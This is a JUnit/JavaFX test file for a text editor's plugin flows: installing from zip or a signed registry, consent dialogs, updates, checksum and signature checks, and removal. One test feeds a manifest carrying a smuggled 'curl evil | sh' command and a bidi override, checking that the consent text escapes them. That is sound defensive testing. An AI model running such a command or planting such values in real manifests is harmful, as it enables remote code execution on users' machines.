package com.editora.ui;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Deque;
import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.ExecutorService;

import javafx.scene.layout.Region;
import javafx.stage.Window;

import com.editora.command.CommandRegistry;
import com.editora.config.Settings;
import com.editora.editor.EditorBuffer;
import com.editora.io.LoopbackDownloads;
import com.editora.io.TestArchives;
import com.editora.plugin.Plugin;
import com.editora.plugin.PluginContext;
import com.editora.plugin.PluginDescriptor;
import com.editora.plugin.PluginInstaller;
import com.editora.plugin.PluginRegistry;
import com.editora.plugin.PluginTestAccess;
import com.editora.plugin.RegistryEntry;
import com.editora.plugin.ToolWindowSide;
import com.editora.ui.PluginCoordinator.Question;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.Tag;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.TestInstance;
import org.junit.jupiter.api.io.TempDir;

import static com.editora.i18n.Messages.tr;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * The plugin flows a user drives from Settings → Plugins, in a real window: install from a zip, install
 * from a registry, the consent question that stands between "on disk" and "enabled", what a restart then
 * loads, and removal. The registry and its downloads are served from a loopback server, signed with a key
 * pair made here; the confirm dialogs and the file chooser are answered through the coordinator's test seams.
 *
 * <p>Each test builds its own {@link PluginCoordinator} over the fixture window's collaborators (the same
 * arguments {@code MainController} passes) so it can supply the loopback registry and a recording
 * {@code Ops}. What a restart loads is checked on the window's own coordinator, by booting a second window
 * on the same config directory.
 */
@Tag("fx")
@TestInstance(TestInstance.Lifecycle.PER_CLASS)
class PluginCoordinatorFxTest {

    private static final String INDEX_URL = "https://plugins.example.org/registry/index.json";
    private static final String ZIP_URL = "https://plugins.example.org/releases/greeter-1.0.zip";

    /** What {@link GreeterPlugin} was asked to do, across windows. */
    private static final List<String> PLUGIN_EVENTS = new CopyOnWriteArrayList<>();

    /** The Java half of the test plugin: loaded by name through the plugin class loader's parent. */
    public static final class GreeterPlugin implements Plugin {
        @Override
        public void start(PluginContext context) {
            PLUGIN_EVENTS.add("start");
            context.registerCommand("wave", "Greeter: Wave", () -> PLUGIN_EVENTS.add("wave"));
            context.registerToolWindow("panel", "Greeter", ToolWindowSide.BOTTOM, new Region(), null, null, false);
        }

        @Override
        public void stop() {
            PLUGIN_EVENTS.add("stop");
        }
    }

    @TempDir
    Path sandbox;

    @BeforeAll
    void setUp() throws Exception {
        FxTestSupport.bootToolkit();
    }

    private static byte[] greeterZip(String version, boolean withCode) {
        String manifest = "{\"id\":\"greeter\",\"name\":\"Greeter\",\"version\":\"" + version + "\","
                + (withCode ? "\"main\":\"" + GreeterPlugin.class.getName() + "\"," : "")
                + "\"commands\":[{\"id\":\"hello\",\"title\":\"Greeter: Hello\",\"run\":[\"greeter-tool\",\"--hello\"]}]}";
        return TestArchives.zip("plugin.json", manifest, "snippets/markdown.json", "{}");
    }

    /** Forwards what the coordinator needs to the real window and keeps the status messages. */
    private static final class RecordingHost extends CoordinatorHostStub {
        private final CoordinatorHost window;
        final List<String> statuses = new ArrayList<>();

        RecordingHost(CoordinatorHost window) {
            this.window = window;
        }

        @Override
        public Settings settings() {
            return window.settings();
        }

        @Override
        public boolean simpleModeActive() {
            return window.simpleModeActive();
        }

        @Override
        public EditorBuffer activeBuffer() {
            return window.activeBuffer();
        }

        @Override
        public void setStatus(String message) {
            statuses.add(message);
            window.setStatus(message);
        }

        @Override
        public void requestSave() {
            window.requestSave();
        }

        @Override
        public OverlayHost overlayHost() {
            return window.overlayHost();
        }

        @Override
        public Window window() {
            return window.window();
        }

        String last() {
            return statuses.isEmpty() ? null : statuses.get(statuses.size() - 1);
        }
    }

    /** A window with plugins switched on, and a coordinator in it wired to the loopback registry. */
    private final class Rig {
        final AsyncTestScope scope;
        final FxWindowFixture fx;
        final LoopbackDownloads web;
        final KeyPair registryKeys;
        final RecordingHost host;
        final PluginRegistry registry;
        final PluginInstaller installer;
        final PluginCoordinator coordinator;
        final List<Question> questions = new ArrayList<>();
        /** Answers to the next questions, in order; once used up, the answer is yes. */
        final Deque<Boolean> answers = new ArrayDeque<>();

        final List<String> errors = new ArrayList<>();
        File chosenZip;
        int chooserShown;

        Rig(AsyncTestScope scope, Path configDir) throws Exception {
            this.scope = scope;
            fx = scope.own(FxWindowFixture.create(
                    configDir, shared -> shared.getSettings().setPluginSupport(true)));
            web = scope.own(new LoopbackDownloads());
            registryKeys = KeyPairGenerator.getInstance("Ed25519").generateKeyPair();
            registry = PluginTestAccess.registry(web.client(), registryKeys::getPublic);
            installer = PluginTestAccess.installer(fx.windowManager.pluginManager(), web.client(), 1024 * 1024);
            MainController mc = fx.controller;
            host = new RecordingHost(FxTestSupport.field(mc, "coordinatorHost"));
            PluginCoordinator.Ops ops = new PluginCoordinator.Ops() {
                @Override
                public void openPath(Path file) {}

                @Override
                public void showError(String summary, String detail) {
                    errors.add(summary + " | " + detail);
                }
            };
            coordinator = FxTestSupport.callOnFx(() -> new PluginCoordinator(
                    host,
                    FxTestSupport.field(mc, "registry"),
                    FxTestSupport.field(mc, "keymap"),
                    FxTestSupport.field(mc, "snippets"),
                    FxTestSupport.field(FxTestSupport.field(mc, "templateActions"), "templates"),
                    FxTestSupport.field(mc, "toolWindows"),
                    FxTestSupport.field(mc, "statusBar"),
                    FxTestSupport.field(mc, "settingsWindow"),
                    FxTestSupport.field(mc, "config"),
                    fx.windowManager.pluginManager(),
                    ops,
                    registry,
                    installer));
            coordinator.setConfirmForTest(q -> {
                questions.add(q);
                return answers.isEmpty() || answers.poll();
            });
            coordinator.setZipChooserForTest(() -> {
                chooserShown++;
                return chosenZip;
            });
            scope.onClose(() -> FxTestSupport.runOnFx(() -> {
                palette().hide();
                coordinator.disposePlugins();
            }));
        }

        Settings settings() {
            return fx.shared.getSettings();
        }

        boolean enabled(String id) {
            return fx.shared.getPluginStore().isEnabled(id);
        }

        Path pluginsDir() {
            return fx.configDir.resolve("plugins");
        }

        List<PluginDescriptor> installed() {
            return fx.windowManager.pluginManager().descriptors();
        }

        CommandRegistry commands() {
            return FxTestSupport.field(fx.controller, "registry");
        }

        List<String> toolWindowIds() throws Exception {
            ToolWindowManager toolWindows = FxTestSupport.field(fx.controller, "toolWindows");
            return FxTestSupport.callOnFx(() -> toolWindows.getRegisteredToolWindows().stream()
                    .map(ToolWindow::getId)
                    .toList());
        }

        QuickOpen<RegistryEntry> palette() {
            return FxTestSupport.field(coordinator, "browsePalette");
        }

        List<Question.Kind> asked() {
            return questions.stream().map(Question::kind).toList();
        }

        void installFromDisk(byte[] zip) throws Exception {
            Path file = Files.createTempFile(sandbox, "picked-", ".zip");
            Files.write(file, zip);
            chosenZip = file.toFile();
            FxTestSupport.runOnFx(coordinator::installFromDisk);
            awaitInstaller();
        }

        void awaitInstaller() throws Exception {
            scope.awaitWorker(FxTestSupport.<ExecutorService>field(installer, "exec"));
            scope.awaitFx();
        }

        /** Publishes {@code index} (signed or not), opens Browse Plugins, and waits for the fetch to land. */
        void browse(String index, boolean signed) throws Exception {
            byte[] bytes = index.getBytes(StandardCharsets.UTF_8);
            web.serve(INDEX_URL, bytes);
            if (signed) {
                Signature s = Signature.getInstance("Ed25519");
                s.initSign(registryKeys.getPrivate());
                s.update(bytes);
                web.serve(INDEX_URL + ".sig", Base64.getEncoder().encodeToString(s.sign()));
            }
            settings().setPluginRegistryUrl(INDEX_URL);
            browseAgain();
        }

        void browseAgain() throws Exception {
            FxTestSupport.runOnFx(coordinator::browse);
            scope.awaitWorker(FxTestSupport.<ExecutorService>field(registry, "exec"));
            scope.awaitFx();
        }

        List<RegistryEntry> listed() {
            return FxTestSupport.field(coordinator, "browseEntries");
        }

        /** Picks {@code entry} in the Browse Plugins list — what Enter on the row does. */
        void choose(RegistryEntry entry) throws Exception {
            FxTestSupport.runOnFx(
                    () -> FxTestSupport.invokeWith(coordinator, "confirmAndInstall", RegistryEntry.class, entry));
            awaitInstaller();
        }
    }

    private static String index(byte[] zip, String extraFields) {
        return "{\"schemaVersion\":1,\"plugins\":[{\"id\":\"greeter\",\"name\":\"Greeter\",\"version\":\"1.0\","
                + "\"author\":\"Ada\",\"description\":\"Says hello\",\"download\":\"" + ZIP_URL + "\",\"sha256\":\""
                + PluginTestAccess.sha256(zip) + "\"" + extraFields + "}]}";
    }

    // --- install from disk → consent → next launch → remove -------------------------------------------

    /**
     * The whole life of a plugin. Installing puts it on disk and asks, with its capabilities spelled out,
     * whether to enable it; nothing of it runs in the window that installed it. The next window on the same
     * configuration loads it — its declared command, the command and tool window its code registers. Removing
     * it deletes the folder and the consent, and the window after that has no trace of it.
     */
    @Test
    void aPluginInstalledFromDiskLoadsOnTheNextLaunchAndIsGoneAfterRemoval() throws Exception {
        PLUGIN_EVENTS.clear();
        Path configDir = Files.createDirectories(sandbox.resolve("lifecycle"));

        try (AsyncTestScope scope = new AsyncTestScope()) {
            Rig first = new Rig(scope, configDir);
            first.fx.keepConfigDir = true;

            first.installFromDisk(greeterZip("1.0", true));

            assertEquals(List.of(), first.errors);
            assertEquals(List.of(Question.Kind.ENABLE), first.asked());
            String disclosure = first.questions.get(0).text();
            assertTrue(disclosure.contains("Greeter 1.0"), disclosure);
            assertTrue(disclosure.contains(tr("plugins.cap.code")), "it ships code, and says so: " + disclosure);
            assertTrue(
                    disclosure.contains("Greeter: Hello: [\"greeter-tool\", \"--hello\"]"),
                    "the command it would run is shown, its title and each argument: " + disclosure);
            assertTrue(disclosure.contains(tr("plugins.cap.mainClass", GreeterPlugin.class.getName())), disclosure);
            assertTrue(first.enabled("greeter"));
            assertEquals(tr("status.plugins.installed", "Greeter"), first.host.last());
            assertTrue(Files.isRegularFile(first.pluginsDir().resolve("greeter/plugin.json")));
            assertEquals(1, first.installed().size(), "listed in Settings at once");
            assertTrue(first.commands().get("plugin.greeter.hello").isEmpty(), "but not loaded until a restart");
            assertEquals(List.of(), PLUGIN_EVENTS);
        }

        try (AsyncTestScope scope = new AsyncTestScope()) {
            Rig second = new Rig(scope, configDir);
            second.fx.keepConfigDir = true;

            assertTrue(second.enabled("greeter"), "the consent was saved");
            assertEquals(List.of("start"), PLUGIN_EVENTS, "the plugin's code ran in the new window");
            assertTrue(second.commands().get("plugin.greeter.hello").isPresent(), "declared command");
            assertTrue(second.commands().get("plugin.greeter.wave").isPresent(), "command registered by its code");
            assertTrue(second.commands().get("plugin.greeter.panel").isPresent(), "tool window toggle");
            assertTrue(second.toolWindowIds().contains("plugin.greeter.panel"));

            second.answers.add(false);
            FxTestSupport.runOnFx(() -> second.coordinator.uninstall("greeter"));
            assertEquals(List.of(Question.Kind.UNINSTALL), second.asked());
            assertEquals(
                    tr("dialog.plugins.uninstallHeader", "Greeter"),
                    second.questions.get(0).header());
            assertTrue(second.questions.get(0).text().contains("greeter"), "the folder is named");
            assertTrue(Files.exists(second.pluginsDir().resolve("greeter")), "declined: nothing is removed");
            assertTrue(second.enabled("greeter"));

            // E3: it runs in this session (its jar may be open): switched off now, deleted at the next start.
            FxTestSupport.runOnFx(() -> second.coordinator.uninstall("greeter"));
            assertEquals(List.of(), second.errors);
            assertTrue(Files.exists(second.pluginsDir().resolve(".remove-greeter")), "marked for the next start");
            assertFalse(second.enabled("greeter"), "the consent to run it is gone at once");
            assertTrue(FxTestSupport.callOnFx(
                    () -> second.fx.windowManager.pluginManager().pendingRemoval("greeter")));
            assertEquals(tr("status.plugins.removalPending", "Greeter"), second.host.last());
        }
        assertEquals(List.of("start", "stop"), PLUGIN_EVENTS, "closing the window stopped the plugin");

        try (AsyncTestScope scope = new AsyncTestScope()) {
            Rig third = new Rig(scope, configDir);

            assertEquals(List.of("start", "stop"), PLUGIN_EVENTS, "nothing of it runs any more");
            assertFalse(Files.exists(third.pluginsDir().resolve("greeter")), "the start deleted its folder");
            assertFalse(Files.exists(third.pluginsDir().resolve(".remove-greeter")));
            assertTrue(third.commands().get("plugin.greeter.hello").isEmpty());
            assertTrue(third.commands().get("plugin.greeter.wave").isEmpty());
            assertFalse(third.toolWindowIds().contains("plugin.greeter.panel"));
            assertEquals(List.of(), third.installed());
        }
    }

    /** Installing is consenting: an install whose capabilities the user turns down puts nothing on disk (A2). */
    @Test
    void decliningTheEnableQuestionInstallsNothing() throws Exception {
        try (AsyncTestScope scope = new AsyncTestScope()) {
            Rig rig = new Rig(scope, Files.createDirectories(sandbox.resolve("declined")));
            rig.answers.add(false);

            rig.installFromDisk(greeterZip("1.0", false));

            assertEquals(List.of(Question.Kind.ENABLE), rig.asked());
            assertFalse(rig.questions.get(0).text().contains(tr("plugins.cap.code")), "no jar, no code warning");
            assertTrue(rig.questions.get(0).text().contains(tr("plugins.cap.snippets")), "its snippets are named");
            assertFalse(rig.enabled("greeter"));
            assertEquals(tr("status.plugins.notInstalled", "Greeter"), rig.host.last());
            assertFalse(Files.exists(rig.pluginsDir().resolve("greeter")));
            assertEquals(List.of(), rig.installed());
            assertEquals(List.of(), stagingLeft(rig), "the staged copy is gone too");
        }
    }

    private static List<String> stagingLeft(Rig rig) throws Exception {
        try (var s = Files.list(rig.pluginsDir())) {
            return s.map(p -> p.getFileName().toString())
                    .filter(n -> n.startsWith("."))
                    .toList();
        }
    }

    /**
     * An update is staged beside the installed version and shown as "Update Greeter 1.0 → 2.0". Turning the new
     * version's capabilities down keeps the version that was installed — and enabled (A2; it used to be replaced
     * first and then switched off).
     */
    @Test
    void decliningAnUpdateKeepsTheInstalledVersionEnabled() throws Exception {
        try (AsyncTestScope scope = new AsyncTestScope()) {
            Rig rig = new Rig(scope, Files.createDirectories(sandbox.resolve("update")));
            rig.installFromDisk(greeterZip("1.0", false));
            assertTrue(rig.enabled("greeter"));

            rig.answers.add(false);
            rig.installFromDisk(greeterZip("2.0", true));

            assertEquals(List.of(Question.Kind.ENABLE, Question.Kind.ENABLE), rig.asked());
            Question second = rig.questions.get(1);
            assertEquals(tr("dialog.plugins.updateHeader", "Greeter", "1.0", "2.0"), second.header());
            assertTrue(second.text().contains(tr("plugins.cap.code")), "and what it newly asks for: " + second);
            assertTrue(rig.enabled("greeter"), "the consent to 1.0 stands");
            assertEquals("1.0", rig.installed().get(0).manifest().version);
            assertEquals(tr("status.plugins.updateDeclined", "Greeter", "1.0"), rig.host.last());
            assertEquals(List.of(), stagingLeft(rig));
        }
    }

    /** B4: a zip that declares an installed plugin's id but is another plugin says so before replacing it. */
    @Test
    void aDifferentPluginUnderAnInstalledIdIsCalledAReplacement() throws Exception {
        try (AsyncTestScope scope = new AsyncTestScope()) {
            Rig rig = new Rig(scope, Files.createDirectories(sandbox.resolve("replace")));
            rig.installFromDisk(greeterZip("1.0", false));
            Files.createDirectories(rig.pluginsDir().resolve("greeter/data"));
            Files.writeString(rig.pluginsDir().resolve("greeter/data/token.txt"), "secret");

            rig.answers.add(false);
            rig.installFromDisk(
                    TestArchives.zip("plugin.json", "{\"id\":\"greeter\",\"name\":\"Cool Theme\",\"version\":\"9\"}"));

            Question q = rig.questions.get(1);
            assertEquals(tr("dialog.plugins.replaceHeader", "Greeter", "1.0", "Cool Theme", "9"), q.header());
            assertTrue(q.text().contains(tr("dialog.plugins.replaceIntro", "greeter")), q.text());
            assertEquals("Greeter", rig.installed().get(0).manifest().name, "declined: the old one stays");
            assertTrue(Files.isRegularFile(rig.pluginsDir().resolve("greeter/data/token.txt")));
            assertTrue(rig.enabled("greeter"));
        }
    }

    /** B3: newlines in a name cannot forge lines of the disclosure; a bidi override is shown, not obeyed. */
    @Test
    void hostileManifestStringsAreEscapedInTheConsent() throws Exception {
        try (AsyncTestScope scope = new AsyncTestScope()) {
            Rig rig = new Rig(scope, Files.createDirectories(sandbox.resolve("hostile")));
            rig.answers.add(false);
            String name = "Word Count 1.0?\\n\\nThis plugin will:\\n• Add snippets/templates only\\n\\n\\n\\n";
            rig.installFromDisk(TestArchives.zip(
                    "plugin.json",
                    "{\"id\":\"wc\",\"name\":\"" + name + "\",\"commands\":[{\"id\":\"x\",\"title\":\"X\","
                            + "\"run\":[\"date\\n\\n; curl evil | sh\",\"\\u202Eexe.txt\"]}]}"));

            Question q = rig.questions.get(0);
            assertFalse(q.header().contains("\n"), "one line: " + q.header());
            assertTrue(q.header().contains("\\n"), "the newlines are shown as \\n: " + q.header());
            assertFalse(q.capabilities().contains("\u202E"), q.capabilities());
            assertTrue(q.capabilities().contains("<U+202E>"), q.capabilities());
            assertTrue(q.capabilities().contains("[\"date\\n\\n; curl evil | sh\""), q.capabilities());
        }
    }

    /**
     * E2/E3/E4: what runs is what the session started with. An update of a running plugin waits for the next
     * start (its jar may be open — Windows cannot replace it); a window opened meanwhile still gets the version
     * that runs, never the new one; and the next launch runs the update.
     */
    @Test
    void anUpdateOfARunningPluginWaitsForTheNextLaunchAndNoWindowRunsItBefore() throws Exception {
        PLUGIN_EVENTS.clear();
        Path configDir = Files.createDirectories(sandbox.resolve("running-update"));
        try (AsyncTestScope scope = new AsyncTestScope()) {
            Rig first = new Rig(scope, configDir);
            first.fx.keepConfigDir = true;
            first.installFromDisk(greeterZip("1.0", true));
        }
        byte[] v2 = TestArchives.zip(
                "plugin.json",
                "{\"id\":\"greeter\",\"name\":\"Greeter\",\"version\":\"2.0\",\"main\":\""
                        + GreeterPlugin.class.getName() + "\",\"commands\":[{\"id\":\"hello2\",\"title\":\"Hi\","
                        + "\"run\":[\"greeter-tool\"]}]}");
        try (AsyncTestScope scope = new AsyncTestScope()) {
            Rig second = new Rig(scope, configDir);
            second.fx.keepConfigDir = true;
            assertTrue(PLUGIN_EVENTS.contains("start"), "1.0 runs in this session");

            second.installFromDisk(v2);

            Question q = second.questions.get(0);
            assertEquals(tr("dialog.plugins.updateHeader", "Greeter", "1.0", "2.0"), q.header());
            assertTrue(q.body().contains(tr("dialog.plugins.afterRestart")), q.body());
            assertEquals(tr("status.plugins.updatePending", "Greeter", "2.0"), second.host.last());
            assertTrue(Files.isDirectory(second.pluginsDir().resolve(".pending-greeter")));
            assertEquals("1.0", second.installed().get(0).manifest().version, "its folder is not touched");
            com.editora.plugin.PluginManager pm = second.fx.windowManager.pluginManager();
            assertEquals("2.0", pm.pendingUpdate("greeter"));

            MainController another = FxTestSupport.callOnFx(() -> second.fx.windowManager.buildWindowForTest());
            CommandRegistry anotherCommands = FxTestSupport.field(another, "registry");
            assertTrue(anotherCommands.get("plugin.greeter.hello").isPresent(), "a new window runs 1.0");
            assertTrue(anotherCommands.get("plugin.greeter.hello2").isEmpty(), "never the update before a restart");
        }
        try (AsyncTestScope scope = new AsyncTestScope()) {
            Rig third = new Rig(scope, configDir);
            assertFalse(Files.exists(third.pluginsDir().resolve(".pending-greeter")), "applied before discovery");
            assertEquals("2.0", third.installed().get(0).manifest().version);
            assertTrue(third.enabled("greeter"), "the consent was given to 2.0's capabilities");
            assertTrue(third.commands().get("plugin.greeter.hello2").isPresent(), "the next launch runs 2.0");
        }
    }

    /** E4: switching a running plugin off is a change for the next launch, for every window — as the page says. */
    @Test
    void switchingARunningPluginOffChangesWhatTheNextLaunchLoads() throws Exception {
        PLUGIN_EVENTS.clear();
        Path configDir = Files.createDirectories(sandbox.resolve("switch-off"));
        try (AsyncTestScope scope = new AsyncTestScope()) {
            Rig first = new Rig(scope, configDir);
            first.fx.keepConfigDir = true;
            first.installFromDisk(greeterZip("1.0", true));
        }
        try (AsyncTestScope scope = new AsyncTestScope()) {
            Rig second = new Rig(scope, configDir);
            second.fx.keepConfigDir = true;
            com.editora.plugin.PluginDescriptor d = second.installed().get(0);
            FxTestSupport.runOnFx(() -> second.coordinator.disableFromSettings(d));
            assertFalse(second.enabled("greeter"));
            assertNotNull(
                    second.fx.windowManager.pluginManager().running("greeter"),
                    "still the session's: its windows keep it until the restart the row asks for");
        }
        try (AsyncTestScope scope = new AsyncTestScope()) {
            Rig third = new Rig(scope, configDir);
            assertTrue(third.commands().get("plugin.greeter.hello").isEmpty(), "off at the next launch");
        }
    }

    @Test
    void aZipThatIsNotAPluginIsReportedAndNothingIsEnabled() throws Exception {
        try (AsyncTestScope scope = new AsyncTestScope()) {
            Rig rig = new Rig(scope, Files.createDirectories(sandbox.resolve("not-a-plugin")));

            rig.installFromDisk(TestArchives.zip("README.md", "hello"));

            String why = tr("plugins.problem.noManifest");
            assertEquals(List.of(tr("status.plugins.installFailed", why) + " | " + why), rig.errors);
            assertEquals(List.of(), rig.asked(), "there is nothing to consent to");
            assertEquals(List.of(), rig.installed());
            assertFalse(Files.exists(rig.pluginsDir().resolve("greeter")));
        }
    }

    @Test
    void cancellingTheFileChooserDoesNothing() throws Exception {
        try (AsyncTestScope scope = new AsyncTestScope()) {
            Rig rig = new Rig(scope, Files.createDirectories(sandbox.resolve("cancelled")));

            FxTestSupport.runOnFx(rig.coordinator::installFromDisk);
            rig.awaitInstaller();

            assertEquals(1, rig.chooserShown);
            assertEquals(List.of(), rig.host.statuses);
            assertEquals(List.of(), rig.asked());
            assertEquals(List.of(), rig.installed());
        }
    }

    /** With the master switch off, the install and browse entry points refuse before asking for anything. */
    @Test
    void withPluginsSwitchedOffNothingCanBeInstalled() throws Exception {
        try (AsyncTestScope scope = new AsyncTestScope()) {
            Rig rig = new Rig(scope, Files.createDirectories(sandbox.resolve("off")));
            rig.settings().setPluginSupport(false);
            rig.settings().setPluginRegistryUrl(INDEX_URL);

            FxTestSupport.runOnFx(rig.coordinator::installFromDisk);
            rig.browseAgain();

            assertEquals(List.of(tr("status.plugins.disabled"), tr("status.plugins.disabled")), rig.host.statuses);
            assertEquals(0, rig.chooserShown);
            assertEquals(List.of(), rig.web.requests());
            assertFalse(rig.palette().isShown());
        }
    }

    // --- install from a registry ----------------------------------------------------------------------

    @Test
    void aSignedRegistryIsListedAndAPluginChosenFromItIsInstalledAfterBothQuestions() throws Exception {
        try (AsyncTestScope scope = new AsyncTestScope()) {
            Rig rig = new Rig(scope, Files.createDirectories(sandbox.resolve("signed")));
            byte[] zip = greeterZip("1.0", false);
            rig.web.serve(ZIP_URL, zip);

            rig.browse(index(zip, ""), true);

            assertEquals(List.of(), rig.errors);
            assertTrue(FxTestSupport.callOnFx(() -> rig.palette().isShown()), "Browse Plugins is open");
            assertEquals(1, rig.listed().size());
            assertEquals("", rig.host.last(), "no unsigned-registry warning, and no stale Fetching… (A10)");

            rig.browseAgain();
            assertEquals(
                    List.of(INDEX_URL, INDEX_URL + ".sig"),
                    rig.web.requests(),
                    "the listing is cached until it changes");

            rig.choose(rig.listed().get(0));

            assertEquals(List.of(Question.Kind.INSTALL, Question.Kind.ENABLE), rig.asked());
            assertEquals(
                    tr("dialog.plugins.installHeaderNew", "Greeter", "1.0"),
                    rig.questions.get(0).header());
            String install = rig.questions.get(0).body();
            assertTrue(install.contains(tr("dialog.plugins.installAuthor", "Ada")), install);
            assertTrue(install.contains(ZIP_URL), "where it will be downloaded from is shown: " + install);
            assertFalse(install.contains(tr("dialog.plugins.unsignedWarn")), install);
            assertTrue(rig.enabled("greeter"));
            assertEquals(tr("status.plugins.installed", "Greeter"), rig.host.last());
            assertTrue(Files.isRegularFile(rig.pluginsDir().resolve("greeter/snippets/markdown.json")));

            // An install changes what the list should say, so the next Browse fetches it again.
            rig.browseAgain();
            assertEquals(
                    List.of(INDEX_URL, INDEX_URL + ".sig", ZIP_URL, INDEX_URL, INDEX_URL + ".sig"), rig.web.requests());
        }
    }

    /**
     * Settings → Plugins → Browse hid the Settings window at once, so a registry that failed left it gone with
     * the reason behind it. It now hides only when the picker (an overlay it would cover) actually opens.
     */
    @Test
    void settingsStepsAsideOnlyWhenThePickerOpens() throws Exception {
        try (AsyncTestScope scope = new AsyncTestScope()) {
            Rig rig = new Rig(scope, Files.createDirectories(sandbox.resolve("aside")));
            byte[] zip = greeterZip("1.0", false);
            rig.web.serve(ZIP_URL, zip);
            SettingsWindow w = FxTestSupport.field(rig.fx.controller, "settingsWindow");
            javafx.stage.Stage stage = FxTestSupport.field(w, "stage");
            rig.settings().setPluginRegistryUrl(INDEX_URL); // before Settings shows it (its field commits on blur)
            FxTestSupport.runOnFx(() -> w.show(FxTestSupport.field(rig.fx.controller, "stage")));

            rig.browse(index(zip, ""), false); // refused: unsigned
            assertTrue(FxTestSupport.callOnFx(stage::isShowing), "Settings stays, the refusal is shown");

            FxTestSupport.runOnFx(() -> rig.settings().setPluginRequireSignature(false));
            rig.browseAgain();
            assertTrue(FxTestSupport.callOnFx(() -> rig.palette().isShown()));
            assertFalse(FxTestSupport.callOnFx(stage::isShowing), "out of the picker's way");

            // A4: Esc in the picker brings Settings back, where the user started.
            FxTestSupport.runOnFx(() -> rig.palette().hide());
            FxTestSupport.drainFx();
            assertTrue(FxTestSupport.callOnFx(stage::isShowing), "Settings is back once the picker closes");

            // And after an install chosen from the picker, once its questions are answered.
            rig.browseAgain();
            assertFalse(FxTestSupport.callOnFx(stage::isShowing));
            rig.choose(rig.listed().get(0));
            assertTrue(rig.enabled("greeter"));
            assertTrue(FxTestSupport.callOnFx(stage::isShowing), "back on the Plugins page with the new row");
            FxTestSupport.runOnFx(stage::hide);
        }
    }

    /** "Require signed plugins" is on by default: an unsigned registry is not even listed. */
    @Test
    void anUnsignedRegistryIsBlockedWhileSignedPluginsAreRequired() throws Exception {
        try (AsyncTestScope scope = new AsyncTestScope()) {
            Rig rig = new Rig(scope, Files.createDirectories(sandbox.resolve("unsigned")));
            assertTrue(rig.settings().isPluginRequireSignature(), "the default");
            byte[] zip = greeterZip("1.0", false);
            rig.web.serve(ZIP_URL, zip);

            rig.browse(index(zip, ""), false);

            assertEquals(
                    List.of(tr("status.plugins.unsigned") + " | " + tr("dialog.plugins.unsignedDetail")), rig.errors);
            assertFalse(FxTestSupport.callOnFx(() -> rig.palette().isShown()));
            assertEquals(List.of(), rig.listed(), "nothing from it can be chosen");
            assertEquals(List.of(), rig.asked());
        }
    }

    /** A registry signed by someone else is as unsigned as one with no signature. */
    @Test
    void aRegistrySignedWithAnotherKeyIsBlockedToo() throws Exception {
        try (AsyncTestScope scope = new AsyncTestScope()) {
            Rig rig = new Rig(scope, Files.createDirectories(sandbox.resolve("wrong-key")));
            byte[] zip = greeterZip("1.0", false);
            String index = index(zip, "");
            Signature s = Signature.getInstance("Ed25519");
            s.initSign(KeyPairGenerator.getInstance("Ed25519").generateKeyPair().getPrivate());
            s.update(index.getBytes(StandardCharsets.UTF_8));
            rig.web.serve(INDEX_URL + ".sig", Base64.getEncoder().encodeToString(s.sign()));

            rig.browse(index, false); // serves the index; the .sig above stays

            assertEquals(1, rig.errors.size());
            assertTrue(rig.errors.get(0).startsWith(tr("status.plugins.unsigned")), rig.errors.get(0));
            assertEquals(List.of(), rig.listed());
        }
    }

    /** With the requirement switched off the registry is usable, and both the status and the question say so. */
    @Test
    void anUnsignedRegistryIsListedWithAWarningOnceTheRequirementIsOff() throws Exception {
        try (AsyncTestScope scope = new AsyncTestScope()) {
            Rig rig = new Rig(scope, Files.createDirectories(sandbox.resolve("unsigned-allowed")));
            rig.settings().setPluginRequireSignature(false);
            byte[] zip = greeterZip("1.0", false);
            rig.web.serve(ZIP_URL, zip);

            rig.browse(index(zip, ""), false);

            assertEquals(List.of(), rig.errors);
            assertTrue(FxTestSupport.callOnFx(() -> rig.palette().isShown()));
            assertEquals(tr("status.plugins.unsignedAllowed"), rig.host.last());

            rig.answers.add(false); // the install question
            rig.choose(rig.listed().get(0));

            assertEquals(List.of(Question.Kind.INSTALL), rig.asked());
            assertTrue(
                    rig.questions.get(0).body().startsWith(tr("dialog.plugins.unsignedWarn")),
                    rig.questions.get(0).body());
            assertFalse(rig.web.requests().contains(ZIP_URL), "declined: nothing is downloaded");
            assertEquals(List.of(), rig.installed());
        }
    }

    @Test
    void aDownloadThatDoesNotMatchTheRegistrysChecksumIsReportedAndNotInstalled() throws Exception {
        try (AsyncTestScope scope = new AsyncTestScope()) {
            Rig rig = new Rig(scope, Files.createDirectories(sandbox.resolve("tampered")));
            byte[] listed = greeterZip("1.0", false);
            rig.web.serve(ZIP_URL, greeterZip("1.0", true)); // not the archive the signed index describes
            rig.browse(index(listed, ""), true);

            rig.choose(rig.listed().get(0));

            assertEquals(List.of(Question.Kind.INSTALL), rig.asked(), "never reaches the enable question");
            String why = tr("plugins.problem.checksum");
            assertEquals(List.of(tr("status.plugins.installFailed", why) + " | " + why), rig.errors);
            assertFalse(rig.enabled("greeter"));
            assertEquals(List.of(), rig.installed());
            assertFalse(Files.exists(rig.pluginsDir().resolve("greeter")));
        }
    }

    @Test
    void aPluginThatNeedsANewerEditoraIsNotOffered() throws Exception {
        try (AsyncTestScope scope = new AsyncTestScope()) {
            Rig rig = new Rig(scope, Files.createDirectories(sandbox.resolve("too-new")));
            byte[] zip = greeterZip("1.0", false);
            rig.web.serve(ZIP_URL, zip);
            rig.browse(index(zip, ",\"minEditoraVersion\":\"999.0.0\""), true);

            rig.choose(rig.listed().get(0));

            assertEquals(List.of(), rig.asked());
            assertEquals(tr("plugins.status.requiresNewer", "999.0.0"), rig.host.last());
            assertFalse(rig.web.requests().contains(ZIP_URL));
        }
    }

    @Test
    void aRegistryThatCannotBeFetchedOrListsNothingSaysSo() throws Exception {
        try (AsyncTestScope scope = new AsyncTestScope()) {
            Rig rig = new Rig(scope, Files.createDirectories(sandbox.resolve("unreachable")));
            rig.settings().setPluginRegistryUrl(INDEX_URL);

            rig.browseAgain(); // nothing is served: 404

